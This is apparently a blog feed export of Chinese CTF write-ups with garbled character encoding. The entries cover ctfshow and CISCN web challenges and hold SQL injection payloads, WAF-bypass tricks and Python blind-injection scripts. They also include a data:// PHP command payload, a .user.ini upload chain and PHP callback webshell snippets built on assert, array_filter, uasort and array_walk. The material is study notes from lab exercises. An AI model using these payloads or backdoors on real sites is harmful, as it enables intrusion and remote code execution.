      <title>ctfshow-sql</title>
      <link href="/2021/06/16/ctfshow-sql/"/>
      <url>/2021/06/16/ctfshow-sql/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><h2>web 171-175</h2><p>å­¦åˆ°çš„çŸ¥è¯†</p><p>1.to_base64</p><p>æœ‰é¢˜ç›®è¯´åˆ°ï¼Œå¦‚æœè¿”å›å€¼é‡Œé¢åŒ¹é…åˆ°äº†flagï¼Œé‚£ä¹ˆåˆ™è¡¨ç¤ºé”™äº†ã€‚è¿™ä¸ªç‚¹è™½ç„¶åœ¨è§£å†³è¿™äº›é¢˜ç›®ä¸Šæ²¡æœ‰ä»€ä¹ˆä½œç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯getåˆ°äº†ä¸€ä¸ªå°tipsï¼Œå¦‚æœæˆ‘ä»¬è¦æƒ³è¦çš„åˆ°äº†ä¸œè¥¿é‡Œé¢å­˜åœ¨flagï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è¿›è¡Œè½¬æ¢ï¼Œè½¬æˆto_base64</p><p><img src="1.PNG"></p><p>2.union select</p><p>æˆ‘ä»¥å‰ä¸€ç›´éƒ½æ˜¯ 1â€™ union select 1,(select * from flag) â€“+</p><p>ä¹‹ç±»çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å®é™…ä¸Šå¯ä»¥ä½¿ç”¨ 1â€™ union select username,password from è¡¨å where â€¦. limit â€¦â€“+</p><p>3.into outfile â€˜/var/www/var/1.txtâ€™</p><p>åˆ™æˆ‘ä»¬å°±å¯ä»¥å°†æˆ‘ä»¬æŸ¥è¯¢åˆ°çš„ç»“æœå†™é“äº†ä¸€ä¸ª1.txtæ–‡ä»¶é‡Œé¢äº†</p><p><img src="2.PNG"></p><p>ä¸ºä»€ä¹ˆè¦é‡‡ç”¨ç”¨è¿™ä¸ªåšæ³•å‘¢ï¼Ÿå› ä¸ºè¿™é“é¢˜å¤ªç‹—äº†ï¼Œè¿‡æ»¤äº†0-127çš„å­—ç¬¦ä»€ä¹ˆéƒ½è¾“ä¸å‡ºæ¥</p><p>4.replace</p><p><img src="3.PNG"></p><p>å°±æ˜¯è¯´174å˜›ï¼Œä»–ä¸æ˜¯ä¸è®©è¾“å‡ºæ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†ä»–è¾“å‡ºçš„æ•°å­—è¿›è¡Œè½¬æ¢</p><p>replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,â€™1â€™,â€™Aâ€™),â€™2â€™,â€™Bâ€™),â€™3â€™,â€™Câ€™),â€™4â€™,â€™Dâ€™),â€™5â€™,â€™Eâ€™),â€™6â€™,â€™Fâ€™),â€™7â€™,â€™Gâ€™),â€™8â€™,â€™Hâ€™),â€™9â€™,â€™Iâ€™),â€™0â€™,â€™Jâ€™)</p><p>å°±è¿™æ ·å­ï¼Œå°±æ¬§å…‹äº†</p><p>è¡¨ååˆ—åå¯ä»¥ç”¨``æŠ±èµ·æ¥ï¼Œå¦‚æœé‡åˆ°é‚£ä¸ªç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨è¿™ä¸ª</p><p>ç©ºæ ¼è¿‡æ»¤è¿˜å¯ä»¥ä½¿ç”¨%09,%0a,%0b,%0cï¼ˆåˆ¶è¡¨ç¬¦ï¼‰</p><p><img src="4.PNG"></p><p><img src="5.jpg"></p><p>æµ‹è¯•å“ªä¸€ç‚¹è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨ç®€å•çš„ä¸€æ®µè¯­å¥æ¥æµ‹è¯• 1â€™ or â€˜aâ€™=â€™a</p><p>æœ‰ä¸€é“é¢˜ç›®çš„æ³¨é‡Šç¬¦è¢«è¿‡æ»¤äº†ï¼Œæˆ‘çµæœºä¸€åŠ¨æƒ³åˆ°äº†1â€™union select 1,2,â€™3 å˜¿å˜¿</p><p>å˜¿å˜¿å˜¿ï¼Œç¾¤ä¸»åšçš„æ˜¯çŸ¥é“äº†idæ‰å¼€å§‹åšçš„</p><h2></h2><pre><code>function waf($str)&#123;return preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#39;, $str);  &#125;</code></pre><p>å› ä¸ºè¿™é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è¿™ä¸ªwaf,emmmm,ç©ºæ ¼è¿‡æ»¤ï¼Œæ³¨é‡Šç¬¦è¿‡æ»¤ï¼Œinto fileè¿‡æ»¤ï¼Œselectè¿‡æ»¤ï¼Œandï¼Œorè¿‡æ»¤</p><p>æ‰€ä»¥åªèƒ½è€ƒè™‘ç›²æ³¨</p><p><img src="5.PNG"></p><p>æˆ‘åœ¨çœ‹ç¾¤ä¸»çš„è§†é¢‘çš„æ—¶å€™ï¼Œæˆ‘çœŸçš„æ˜¯ç¾¡æ…•äº†ï¼Œä»–pythonæ€ä¹ˆè·‘çš„è¿™ä¹ˆå—ï¼Œåˆ°æˆ‘è¿™é‡Œæ…¢çš„è¦æ­»ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>å› ä¸ºè¯¥è¿‡æ»¤çš„éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç›²æ³¨</p><p>å†™ä¸€ä¸‹è„šæœ¬ï¼š</p><pre><code>import requestsurl=&#39;url&#39;flag=&#39;&#39;flagstr=&#39;&#123;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#39;payload=&#39;`ctfshow_user`where(substr(`pass`,&#123;&#125;,1)regexp(\&#39;&#123;&#125;\&#39;))&#39;for i in range:    for c in flagstr:        data=&#123;            &#39;tableName&#39;:payload.format(str(i),c)            &#125;        rep=requests.post(url,data)        if(rep.text.find($user_count = 1;&quot;&gt;0):            flag=flag+c            breakprint(flag)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN_2019_Final_12_Day2_Web1</title>
      <link href="/2021/06/15/CISCN-2019-Final-12-Day2-Web1/"/>
      <url>/2021/06/15/CISCN-2019-Final-12-Day2-Web1/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æœ€è¿‘è¦æœŸæœ«å¤ä¹ ï¼Œå°±æ²¡æœ‰ä»€ä¹ˆæ—¶é—´å­¦ä¹ CTFï¼Œæƒ³ç€å°±è·Ÿç€å¤§ä½¬çš„æ€è·¯èµ°ä¸€éæ…¢æ…¢å­¦</p><span id="more"></span><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œç„¶åå°è¯•äº†ï¼ŒæŠ¥é”™æ³¨å…¥ä»¥åŠrollupå‘ç°æˆ‘æ— åˆ—åæ³¨å…¥ç«Ÿç„¶åˆä¸ä¼šäº†</p><p>å®³â€¦æ˜å¤©ä¸‹åˆè¦æŠŠsqlæ³¨å…¥å¥½å¥½åœ¨çœ‹ä¸€çœ‹</p><p>ç„¶åæ‰«æï¼Œå‘ç°æœ‰robots.txtï¼Œæˆ‘ç¬¬ä¸€çœ¼è®¤ä¸ºè¿™æ²¡æœ‰å•¥ä¸œè¥¿</p><p><img src="1.png"></p><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬çœ‹åˆ°è¿™é‡Œå°±å¿…éœ€æœ‰è­¦æƒ•å¿ƒï¼Œæƒ³ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šæç¤ºåˆ°php.bak,é‚£ä¹ˆå°±çŒœæµ‹è¯¾èƒ½å­˜åœ¨ä¸€ä¸ªå¤‡ä»½æ³„éœ²çš„é—®é¢˜</p><p>ç„¶åå°è¯•index.php.bak,image.php.bak,user.php.bak,åæ­£åœ¨ctrl ué‡Œé¢å­˜åœ¨çš„ä¸œè¥¿éƒ½ä¸èƒ½æ”¾è¿‡ï¼Œç„¶åé€ image.php.baké‡Œé¢ä¸­æ‰¾åˆ°äº†æºç </p><p>ä»£ç å®¡è®¡</p><pre><code>&lt;?phpinclude &#39;config.php&#39;;//æç¤ºäº†å­˜åœ¨config.php$id=isset($_GET[&#39;id&#39;])?$_GET[&#39;id&#39;]:&#39;1&#39;;$path=isset($_GET[&#39;path&#39;])?$_GET[&#39;path&#39;]:&#39;&#39;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot;.$row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);</code></pre><p><img src="2.PNG"></p><p>ç„¶åä»è¿™é‡Œå¯ä»¥çœ‹æ¥ï¼Œè¿™é“é¢˜ç›®æ˜¯å…¸å‹çš„å¸ƒå°”ç›²æ³¨ï¼Œid=0æ­£å¥½æŠ¥é”™ï¼Œidä¸º1æ˜¾ç¤ºæ­£ç¡®</p><p>ä¸»è¦è€ƒè™‘ï¼š</p><p>æ€ä¹ˆç»•è¿‡å•å¼•å·è¿‡æ»¤ï¼Œé—­åˆidçš„å•ä¸€å·ï¼ŒæŠŠå±é™©ä»£ç æ”¾åœ¨pathå˜é‡é‡Œ</p><p>ä¸èƒ½ç”¨å•å¼•å·é—­åˆå•å¼•å·ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨\è½¬ä¹‰å•å¼•å·</p><p>æ‰€ä»¥æ„é€ æˆ‘ä»¬ä¼ å…¥\0ï¼Œå°±ä¼šè¢«åŠ ä¸Š\0ï¼Œç„¶ååœ¨str_replaceé‚£é‡Œå˜æˆäº†\ï¼Œå®Œæˆäº†è½¬ä¹‰</p><p>ç„¶åæ„é€ exp</p><pre><code>import requestsurl = &quot;http://f687a40e-08b5-4265-aa8c-140752053bfe.node3.buuoj.cn/image.php?id=\\0&amp;path=&quot;result = &quot;&quot;for i in range(1,30):low = 32high =128mid = (high+low)//2while(low&lt;high):    payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c),&#123;0&#125;,1))&gt;&#123;1&#125;,1,0)%23&quot;.format(i,mid)    html = requests.get(url+payload)    print(low,high,mid,&quot;:&quot;)    print(url+payload)    if &quot;JFIF&quot; in html.text:        low = mid+1    else:        high = mid    mid = (high+low)//2if(low ==32 or high==128):    breakresult = result + chr(mid)print(result)print(&quot;flag: &quot; ,result)</code></pre><p>å¾—åˆ°å¯†ç ï¼š<br>e18be75a8a54cf38a377</p><p>ç„¶åç™»å½•</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowcms</title>
      <link href="/2021/06/07/ctfshowcms/"/>
      <url>/2021/06/07/ctfshowcms/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>ä»£ç æ”¾åœ¨æºç é‡Œäº†</p><p>å…ˆè¯´æˆ‘åšçš„æ—¶å€™å¡çš„ç¬¬ä¸€ä¸ªç‚¹æ˜¯ï¼š</p><p>æˆ‘æƒ³è¿æ¥ä»–çš„æ•°æ®åº“ï¼Œä½†æ˜¯å› ä¸ºinstallLock.txtå·²ç»åœ¨dataè¿™ä¸ªæ–‡ä»¶é‡Œå­˜åœ¨äº†æ‰€ä»¥å°±ä¼š</p><p><img src="1.PNG"></p><p>exitâ€¦</p><p>æˆ‘å½“æ—¶æƒ³çš„æ˜¯è¦æ€ä¹ˆåˆ é™¤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®Œç¾çš„ç¼ºç‚¹</title>
      <link href="/2021/06/04/%E5%AE%8C%E7%BE%8E%E7%9A%84%E7%BC%BA%E7%82%B9/"/>
      <url>/2021/06/04/%E5%AE%8C%E7%BE%8E%E7%9A%84%E7%BC%BA%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>åšé¢˜éšè®°ï¼Œç­‰åšå‡ºæ¥ååœ¨è¿›è¡Œæ€»ç»“æ•´ç†</p><p><img src="1.PNG"></p><p><img src="2.PNG"></p><p>é‚£ä¹ˆå¦‚æœæœ‰æ²¡æœ‰å¯èƒ½è¿™å°±æ˜¯è·¯å¾„</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>å®éªŒæˆåŠŸå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</p><p>ä½†æ˜¯å‡ºç°é—®é¢˜äº†ï¼Œè¿™é“é¢˜ç›®æœ‰open_basedirçš„é™åˆ¶ã€‚ã€‚ã€‚æ ¹æœ¬å°±æ— æ³•åœ¨/c/t/f/s/h/o/w/è¿™é‡Œé¢åšæ–‡ç« </p><p><img src="5.PNG"></p><p>ç°åœ¨çš„å½“åŠ¡ä¹‹æ€¥å°±æ˜¯æƒ³ç€æ€ä¹ˆç»•è¿‡è¿™ä¸ªopen_basedir</p><p>æˆ‘è¿™é‡Œæ€è·¯é”™äº†ï¼Œ</p><p>å…ˆè´´å‡ºæ¥æºç </p><pre><code> highlight_file(__FILE__);  error_reporting(0); ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;); $file_name = substr($_GET[&#39;file_name&#39;], 0,16); $file_content=substr($_GET[&#39;file_content&#39;], 0,32); file_put_contents(&#39;/c/t/f/s/h/o/w/&#39;.$file_name, $file_content); if(file_get_contents(&#39;php://input&#39;)===&#39;ctfshow&#39;)&#123; include($file_name); &#125;</code></pre><p><img src="6.png"></p><p><img src="7.png"></p><p><img src="8.png"></p><p>ç„¶åè¿˜æœ‰å­¦åˆ°dataçš„ä¸ºåè®®ï¼Œè¿™ç§å†™æ³•ä»¥å‰è¿˜æ²¡æœ‰è§è¿‡</p><pre><code>data:,&lt;?=`nl *`;</code></pre><p>éœ€è¦è¿›è¡Œç¼–ç </p><p><img src="9.PNG"></p><p>#åæ€</p><p>æ„Ÿè§‰è‡ªå·±çš„æ€ç»´è¿˜æ˜¯ä¸å¼€é˜”ï¼Œå¾ˆå®¹æ˜“é™·å…¥åˆ°äº†æŸç§æ€è·¯é‡Œé¢å°±å‡ºä¸æ¥äº†ï¼Œå¯¼è‡´é¢˜ç›®æ²¡æœ‰åšå‡ºæ¥</p><p>å¦‚æœæ²¡æœ‰è¿›è¡Œç›®å½•é™åˆ¶çš„è¯æ˜¯å¯ä»¥åˆ©ç”¨ç›®å½•ç©¿è¶Šçš„æ¥å†™æ–‡ä»¶çš„</p><p><img src="10.PNG"></p><p><img src="11.PNG"></p><p>ä½†æ˜¯å¾ˆæ˜¾ç„¶æ²¡æœ‰å¿…è¦è¿™æ ·åšï¼Œæ–‡ä»¶åŒ…å«çš„è¯å¯ä»¥ç›´æ¥ç”¨dataåè®®ã€‚ã€‚ã€‚</p><p>å¸Œæœ›ä¸‹æ¬¡å½“ä¸€ä¸ªæ€è·¯è¢«å µç€çš„è¯å¯ä»¥å¾ˆå¥½çš„è½¬æ¢æ€è·¯ã€‚ã€‚ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>babyphp</title>
      <link href="/2021/06/04/babyphp/"/>
      <url>/2021/06/04/babyphp/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>å¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå¼€å¿ƒå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå¤ªå¼€å¿ƒå•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å•¦å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</p><span id="more"></span><p>æºç </p><pre><code>&lt;?phpclass fileUtil&#123;private $name;private $content;//è¿™å±æ€§æ˜¯ç§æœ‰çš„public function __construct($name.$content=&#39;&#39;)&#123;//è¿™é‡Œæˆ‘åœ¨æƒ³å¥½åƒæ˜¯å¦‚æœcontentä¼ å€¼äº†å°±æŒ‰å®ƒä¼ çš„å€¼æ¥è¦æ˜¯æ²¡æœ‰å°±é»˜è®¤ä¸ºâ€˜ â€™    $this-&gt;name=$name;    $this-&gt;content=$content;    ini_set(&#39;open_basedir&#39;,&#39;/var/www/html&#39;);//å°†ç”¨æˆ·çš„è®¿é—®é™åˆ¶åœ¨/var/www/htmlä¸‹&#125;//è¿™ä¸€å—å°±æ˜¯å®Œæˆäº†èµ‹å€¼ï¼Œç„¶åé™åˆ¶ç”¨æˆ·çš„è®¿é—®è·¯å¾„public function file_upload()&#123;    if($this-&gt;waf($this-&gt;name)&amp;&amp;$this-&gt;waf($this-&gt;content))&#123;        return file_put_contents($this-&gt;name,$this-&gt;content);//è¿™é‡Œæˆ‘æƒ³åˆ°äº†å¯ä»¥ä¸Šä¼ æœ¨é©¬ï¼Œç°åœ¨çš„é—®æç¤ºæˆ‘è¯¥æ€ä¹ˆç»•è¿‡å“ªä¸ªcase    &#125;else&#123;        return 0;    &#125;&#125;//æˆ‘æ„Ÿè§‰è¿™é‡Œå°±æ˜¯æ¼æ´åˆ©ç”¨çš„ç‚¹private function waf($input)&#123;    return !preg_match(&#39;php/i&#39;,$input);&#125;public function file_download()&#123;    if(file_exists($this-&gt;name))&#123;        header(&#39;Content-Type: application/octet-stream&#39;);        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$this-&gt;name.&#39;&quot;&#39;);        header(&#39;Content-Transfer-Encoding: binary&#39;);        echo file_get_contents($this-&gt;name);    &#125;else&#123;        return False;    &#125;&#125;public function __destruct()&#123;&#125;&#125;$action=$_GET[&#39;a&#39;]?$_GET[&#39;a&#39;]:highlight_file(__FILE__);//ä¼ å…¥ä¸€ä¸ªå‚æ•°aif($action===&#39;upload&#39;)&#123;die(&#39;Permission denied&#39;);//ä¸ºä»€ä¹ˆè¿™é‡Œä¼šæŠŠuploadè¿‡æ»¤æ‰ï¼Œå¹¶ä¸”æ˜¯å¼ºç­‰äº&#125;switch($action)&#123;case &#39;upload&#39;:$name=$_POST[&#39;name&#39;];$content =$_POST[&#39;content&#39;];//ä¼ å…¥ä¸¤ä¸ªå‚æ•°$ft=new fileUtil($name,$content);//newäº†ä¸€ä¸ªç±»if($ft-&gt;file_upload())&#123;    echo $name.&#39;upload success!&#39;;&#125;break;case &#39;download&#39;:$name=$_POST[&#39;name&#39;];$ft=new fileUtil($name,$content);//åˆnewäº†ç›¸åŒçš„ç±»ï¼Œä½†æ˜¯è¿™æ¬¡contentä¸ºç©ºif($ft-&gt;file_download()===False)&#123;    echo $name.&#39;download failed&#39;;&#125;break;default:echo &#39;baby come on&#39;;break;&#125;/*1.ä¸ºä»€ä¹ˆè¿™é‡Œä¼šæŠŠuploadè¿‡æ»¤æ‰ï¼Œå¹¶ä¸”æ˜¯å¼ºç­‰äºï¼Œå¼ºç­‰äºå°±å¯ä»¥è¿›è¡Œç»•è¿‡2.æ˜¯ä¸æ˜¯æœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯é•¿ä¼ ï¼Œä¸€ä¸ªæ˜¯ä¸‹è½½ï¼Œä½†æ˜¯ä¸‹è½½é‡Œé¢æ˜¯å¼ºç­‰äºfalseï¼Œå¹¶ä¸”contençš„å€¼ä¸ºç©ºå¦‚æœæˆ‘æ˜¯ç”¨downloadå‡ºé—®é¢˜çš„åœ°æ–¹å°±æ˜¯æˆ‘ä¸çŸ¥é“flagåœ¨å“ªé‡Œè—ç€*/</code></pre><p>è¿™æ˜¯æˆ‘å½“æ—¶åˆ†æä»£ç å†™çš„ï¼Œä»”ç»†çš„çœ‹è¿‡åæ„Ÿè§‰ä»£ç é‡Œé¢çš„æ¼æ´ç‚¹å‡ºå†äº†file_put_contents,è¿™ä¸ªå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²å†™è¿›æ–‡ä»¶é‡Œé¢</p><p>æˆ‘è¦å®ç°è¿™ä¸ªçš„è¯éœ€è¦å†switché‚£é‡Œé¢è§¦å‘upload,ç„¶åè§¦å‘ç±»ï¼Œæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰çœ‹åˆ°ï¼Œé¢˜ç›®ç”¨å¼ºç­‰äºå°†uploadè¿‡æ»¤äº†ï¼Œå‘ç¾¤ä¸»å’¨è¯¢ï¼Œä»–è¯´è¿™å°±æ˜¯é¢˜ç›®éªšçš„åœ°æ–¹ã€‚ã€‚ã€‚</p><p>æˆ‘å½“æ—¶åˆæƒ³åˆ°æ˜¯è¯´caseä¼šä¸ä¼šæ˜¯å¼±ç±»å‹æ¯”è¾ƒï¼Œå› ä¸ºç€å¾ˆå®¹æ˜“æƒ³åˆ°é€šè¿‡è¿™ä¸ªå»ç»•è¿‡ï¼Œä½†æ˜¯æˆ‘è¾“å…¥upload1ä»€ä¹ˆä¹‹ç±»çš„æ²¡æœ‰æˆåŠŸï¼Œå› ä¸ºæˆ‘è®°é”™çŸ¥è¯†äº†</p><p><a href="https://ckylsy.github.io/2021/02/02/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">è‡ªå·±ä»¥å‰å†™çš„åšå®¢</a></p><p>å¦‚æœä»€ä¹ˆéƒ½ä¸è¾“å…¥çš„è¯å°±ç›´æ¥è·³è½¬åˆ°uploadè¿™é‡Œï¼ŒæˆåŠŸç»•è¿‡</p><p>ç„¶åæˆ‘ä»¬å°±è¯¥æƒ³è¦æ€ä¹ˆä¸Šä¼ äº†</p><p>ç­‰ç­‰ç­‰</p><p>æˆ‘çœ‹äº†ç¾¤ä¸»çš„WPï¼Œå­¦åˆ°äº†ä¸€ä¸ªå°tipsï¼Œæœ‰ä¸€ä¸ªæ¼æ´ç‚¹æˆ‘ä»¥å‰æ²¡æœ‰è§åˆ°è¿‡$action=$_GET[â€˜aâ€™]?$<em>GET[â€˜aâ€™]:highlight_file(__FILE_</em>);</p><p>è¿™é‡Œï¼Œæˆ‘æ˜ç™½äº†å½“æ—¶é—®ç¾¤ä¸»çš„æ—¶å€™ï¼Œç¾¤ä¸»è¯´ä»€ä¹ˆéƒ½ä¸ç”¨ä¼ çš„åŸå› äº†ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªä¸‰å…ƒè¿ç®—ç¬¦ï¼Œå¦‚æœä¼ é€’äº†açš„å€¼å¾—è¯$actionå°±ç­‰äºæˆ‘ä»¬ä¼ é€’çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰ä¼ é€’çš„è¯$action=highlight_file(<strong>FILE</strong>),åœ¨æˆ‘çš„è®¤çŸ¥é‡Œç€ç©æ„ä¸å°±æ˜¯é«˜äº®æ˜¾ç¤ºå˜›ï¼Œæ€ä¹ˆè¿˜æœ‰åˆ«çš„ç”¨é€”ã€‚</p><p><img src="1.PNG"></p><p>å¦‚æœæˆ‘ä»¬ä»€ä¹ˆéƒ½ä¸ä¼ é€’ï¼Œé‚£ä¹ˆ$actionå°±ç­‰äºtrue</p><p><img src="2.png"></p><p>è¿™é‡Œåªè®°å½•ä¸€ä¸‹æˆ‘æé”™çš„</p><p>true:-1ï¼Œâ€œ-1â€ï¼ˆtrueï¼‰ï¼Œnull,array(),â€â€(false)</p><p><img src="3.PNG"></p><p>falseæ­£å¥½è·Ÿtrueéƒ½åç€</p><p><img src="4.PNG"></p><p>0:null,â€phpâ€,â€â€(true),arrayï¼ˆï¼‰ï¼ˆfalseï¼‰</p><p>null:â€â€,array()(true),â€phpâ€(false)</p><p>ç„¶åå°±æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œå°±æ˜¯è¿™é‡Œç¾¤ä¸»è®©æˆ‘åœ¨å¥½å¥½çœ‹çœ‹ctfshowçš„é¢˜ç›®ï¼Œæˆ‘å½“æ—¶åˆæƒ³åˆ°ä¸Šä¼ .user.iniä½†æ˜¯å½“æ—¶ä¸çŸ¥åˆ°ä¸Šä¼ æœºåˆ¶æ˜¯ä»€ä¹ˆï¼Œå› ä¸ºå½“æ—¶ç¡®å®å¯¹è¿™ä¸ªæ²¡æœ‰ä»€ä¹ˆå¥½çš„å­¦ä¹ </p><p>æ„é€ payload<br>    ?name=.user.ini&amp;&amp;content=atoi_prepend_file=1.png<br>    ?name=1.png$$content=<?=`ls`?></p><p>æˆåŠŸï¼Œåœ¨uploadç›®å½•ä¸‹æ‰¾åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPå›è°ƒåé—¨</title>
      <link href="/2021/06/03/PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/"/>
      <url>/2021/06/03/PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>åªæ˜¯å¾ˆç®€å•çš„è®°å½•ï¼ŒåŸæ–‡è¿æ¥å†ctfer-æ–‡ä»¶ä¸Šä¼ ï¼Œé‡Œé¢å¯ä»¥æ‰¾åˆ°</p><span id="more"></span><p>ä»Šå¤©åšCGå¾—é¢˜ç›®å¾—æ—¶å€™é‡åˆ°äº†array_walkï¼Œå­˜åœ¨ç€å›è°ƒåé—¨ï¼Œç»†è‡´å­¦ä¹ ä¸€ä¸‹</p><h2>ä»€ä¹ˆæ˜¯å›è°ƒå‡½æ•°</h2><p>å›è°ƒå‡½æ•°å¾—æ„æ€å°±æ˜¯å°†ä¸€ä¸ªå‡½æ•°ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’åˆ°å¦ä¸€ä¸ªå‡½æ•°çš„å‡½æ•°ï¼Œæ¯”å¦‚call_user_func,call_user_func_array,array_mapï¼Œè¿™äº›å‡½æ•°å¯ä»¥å°†å‡½æ•°ä½œä¸ºå‚æ•°ï¼Œæ‰§è¡Œåè¿”å›ç»™ä¸»å‡½æ•°ï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼Œé‚£å¦‚æœä¼ å…¥çš„æ˜¯å±é™©å‡½æ•°ï¼Œå°±å¯èƒ½ä¼šå¼•èµ·åé—¨</p><h2>ä¼ ç»Ÿçš„å›è°ƒå‡½æ•°</h2><p>call_user_func(),å®ƒç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œè¿”å›å€¼æ˜¯å›è°ƒå‡½æ•°çš„ç»“æœ</p><blockquote><p>call_user_func(â€˜assertâ€™,$_REQUEST[â€˜PASSâ€™]);</p></blockquote><p>ä¸å®ƒç±»ä¼¼çš„è¿˜æœ‰call_user_func_array(),ä¸ç¬¬ä¸€ä¸ªçš„åŒºåˆ«å°±æ˜¯è¯´ï¼Œè¿™ä¸ªå¯ä»¥ä¼ å…¥æ•°ç»„</p><h2>å•ä¸ªå‚æ•°å›è°ƒåé—¨</h2><blockquote><p>æ³¨æ„è¿™ä¸ªå•ä¸ªå‚æ•°æ˜¯æŒ‡å›è°ƒå‡½æ•°çš„å‚æ•°ä¸ªæ•°</p></blockquote><p>array_filter</p><p>è¿™ä¸ªå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œå°±æ˜¯å‡½æ•°ä¼šéå†è¿™ä¸ªæ•°ç»„ï¼Œç„¶åå°†æ•°ç»„çš„å€¼ä¼ å…¥åˆ°å›æ‰å‡½æ•°ä¸­</p><blockquote><p>$e=$_GET[â€˜eâ€™];</p><p>$arr=array($_POST[â€˜passâ€™]);</p><p>array_filter($arr,$e);</p></blockquote><p>array_mapåŒä¸Š</p><h2>ä¸¤ä¸ªå‚æ•°å›è°ƒåé—¨</h2><p>uasort</p><blockquote><p>$e=$_GET[â€˜eâ€™];</p><p>$arr=array(â€˜testâ€™,$_POST[â€˜passâ€™]);</p><p>uasort($arr,$e);</p></blockquote><p>æ„Ÿè§‰ä¸¤ä¸ªå‚æ•°å›è°ƒåé—¨ï¼Œå¥½ä¼¼ä¸ªä¸Šä¸€ä¸ªå•ä¸ªå‚æ•°å›è°ƒåé—¨æŒºåƒçš„å“ˆï¼Œå°±æ˜¯æ•°ç»„é‡Œçš„ä¸ªæ•°ä¸ä¸€æ ·</p><p>uksortç±»ä¼¼</p><h2>ä¸‰ä¸ªå‚æ•°å›è°ƒåé—¨</h2><p>array_walk($array,callback,userdata)å¦‚æœæä¾›äº†å¯é€‰å‚æ•°ï¼Œå°†è¢«é€‰ä½œuserdata,ä½œä¸ºç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’ç»™callback</p><p><img src="1.PNG"></p><blockquote><p>$e=$_REQUEST[â€˜eâ€™];</p><p>$arr=array($_POST[â€˜passâ€™]=&gt;â€™|.*|eâ€™);</p><p>array_walk($arr,$e,â€™â€™);</p></blockquote><p>è¿™ä¸ªéœ€è¦é…å’Œpreg_replaceæ¥ä½¿ç”¨</p><p>ç›¸å½“äºæ‰§è¡Œpreg_replace(â€˜|.*|eâ€™,$_POST[â€˜passâ€™],â€™â€™)</p><p><img 